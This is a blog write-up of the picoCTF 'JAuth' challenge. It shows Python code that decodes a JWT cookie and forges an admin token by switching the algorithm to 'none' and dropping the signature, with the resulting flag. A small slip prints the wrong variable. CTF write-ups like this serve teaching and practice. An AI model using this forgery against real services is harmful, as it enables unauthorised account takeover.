<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>JAuth - lavafroth</title><meta name=description content='The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at http://saturn.picoctf.net:52025/
The goal is to become an admin.
We are provied with the username test and the password Test123! to look around.
The challenge is a dummy bank portal. On login, we see the message:'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel="preload stylesheet" href=../../header.svg><noscript><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/noscript.min.css></noscript><link rel=preload as=font href=https://lavafroth.is-a.dev/LeagueGothic.ttf><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body class=not-ready data-menu=true><header class=header><h1><a class=site-name href=https://lavafroth.is-a.dev/>lavafroth</a></h1><svg id="btnDark" class="btn-dark" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 60 60" preserveAspectRatio="xMinYMin meet"><path class="circle" d="M30 16c7.73.0 14 6.27 14 14 0 3.81-1.53 7.27-4 9.8-2.54 2.59-6.08 4.2-10 4.2-7.73.0-14-6.27-14-14 0-7.73 6.27-14 14-14z"/><g class="rays" data-svg-origin="30 30"><line class="line" x1="30" y1="11" x2="30" y2="7"/><line class="line" x1="43.44" y1="16.57" x2="46.26" y2="13.74"/><line class="line" x1="49" y1="30" x2="53" y2="30"/><line class="line" x1="43.43" y1="43.44" x2="46.26" y2="46.26"/><line class="line" x1="30" y1="49" x2="30" y2="53"/><line class="line" x1="16.56" y1="43.43" x2="13.74" y2="46.26"/><line class="line" x1="11" y1="30" x2="7" y2="30"/><line class="line" x1="16.57" y1="16.56" x2="13.74" y2="13.74"/></g></svg><div class=space></div><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><script>const bodyClx=document.body.classList,sysDark=window.matchMedia("(prefers-color-scheme: dark)"),darkVal=localStorage.getItem("dark"),setDark=e=>(bodyClx.toggle("dark",e),localStorage.setItem("dark",e));setDark(darkVal?darkVal==="true":sysDark.matches),requestAnimationFrame(()=>bodyClx.remove("not-ready")),btnDark.addEventListener("click",()=>setDark(!bodyClx.contains("dark"))),sysDark.addEventListener("change",({matches:e})=>setDark(e))</script></header><main class=main><article class=post-single><header class=post-title><p><time>Feb 22, 2022 | 2 minutes read</time></p><h1 data-pagefind-meta=title>JAuth</h1></header><section class=post-content data-pagefind-body><p>The challenge description states that most web application developers use third party components without testing their security.
It mentions some past affected companies, then asks us to identify and exploit the vulnerable component for the challenge at <a href=http://saturn.picoctf.net:52025/>http://saturn.picoctf.net:52025/</a></p><p>The goal is to become an <code>admin</code>.
We are provied with the username <code>test</code> and the password <code>Test123!</code> to look around.</p><p>The challenge is a dummy bank portal. On login, we see the message:</p><blockquote><p>Hello, You have logged in the testing page. There is nothing to see here.</p></blockquote><p>While logging in, if we check the network requests and responses,
we can see a cookie named <code>token</code> being set.</p><pre tabindex=0><code class=language-none data-lang=none>Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjQ1NTE4MjkzMTE5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6OTcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85Ny4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDU1MTgyOTN9.dy45xnUb62Xnhqgo51JmGWRthAUGS-3jKwQ_RlDYCrw; path=/; httponly
</code></pre><p>On closer inspection, the cookie looks like a <abbr title="JSON Web Token">JWT</abbr>.
<a href=https://en.wikipedia.org/wiki/JSON_Web_Token>JWTs</a> comprise three base64 encoded parts, each separated by a dot:</p><ul><li>Header</li><li>Payload</li><li>Verification signature</li></ul><blockquote><p>We can make this educated guess since the value begins with <code>eyJ</code> which partially decodes to <code>{"</code></p></blockquote><p>Let&rsquo;s try to decode the first two parts. I&rsquo;ll use python for this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode, b64encode
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;eyJ0e...&#34;</span> <span style=color:#75715e># replace this with the entire cookie</span>
</span></span><span style=display:flex><span>header, payload <span style=color:#f92672>=</span> [b64decode(part)<span style=color:#f92672>.</span>decode() <span style=color:#66d9ef>for</span> part <span style=color:#f92672>in</span> cookie<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;.&#39;</span>)[:<span style=color:#ae81ff>2</span>]]
</span></span><span style=display:flex><span>print(header)
</span></span><span style=display:flex><span><span style=color:#75715e># {&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;HS256&#34;}</span>
</span></span><span style=display:flex><span>print(cookie)
</span></span><span style=display:flex><span><span style=color:#75715e># {&#34;auth&#34;:1645518293119,&#34;agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&#34;,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># &#34;role&#34;:&#34;user&#34;, &#34;iat&#34;:1645518293}</span>
</span></span></code></pre></div><p>Decoding the signature would result in non-printable characters since it is
the base64 representation of the <abbr title="HMAC SHA256">HS256</abbr> digest of the header,
payload and a 256 bit secret. Other algorithms include <abbr title="RSA SHA256">RSA256</abbr> and
<abbr title="ECDSA SHA256">ES256</abbr>.</p><p>To forge an admin&rsquo;s cookie, we would need to modify the <code>"role"</code> field in the
payload to <code>"admin"</code>. Doing so tampers the verification signature and we would
need the 256 bit secret to generate a valid signature.</p><p>Luckily, we see that the verification algorithm is specified in the cookie&rsquo;s header.
We can modify the <code>"alg"</code> field of the header to <code>"none"</code> and omit the verification signature completely.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>forged <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span> header<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;HS256&#34;</span>, <span style=color:#e6db74>&#34;none&#34;</span>), <span style=color:#75715e># header</span>
</span></span><span style=display:flex><span> payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;user&#34;</span>, <span style=color:#e6db74>&#34;admin&#34;</span>), <span style=color:#75715e># payload</span>
</span></span><span style=display:flex><span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#75715e># empty signature</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>encoded <span style=color:#f92672>=</span> [b64encode(part<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode() <span style=color:#66d9ef>for</span> part <span style=color:#f92672>in</span> forged]
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>join(encoded))
</span></span><span style=display:flex><span><span style=color:#75715e># eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZ2VudCI6Ik1vemlsbGE...</span>
</span></span></code></pre></div><p>This python snippet gives us the forged cookie. Do not forget the trailing dot while copying.
Setting the cookie to this value, we are redirected to the admin page.</p><blockquote><p>Hello, admin! You have logged in as admin!</p></blockquote><p>and we are greeted with the flag <code>picoCTF{succ3ss_@u7h3nt1c@710n_57072644}</code></p></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/authentication-bypass class=list-tag>Authentication Bypass</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/jwt class=list-tag>JWT</a>
<a href=https://lavafroth.is-a.dev/tags/picoctf class=list-tag>PicoCTF</a>
<a href=https://lavafroth.is-a.dev/tags/web class=list-tag>Web</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/picoctf-forensics-operation-oni-operation-orchid/><span>←</span><span>Operation Oni, Operation Orchid</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/liberating-14gib-of-space/><span>Liberating 14GiB of disk space</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>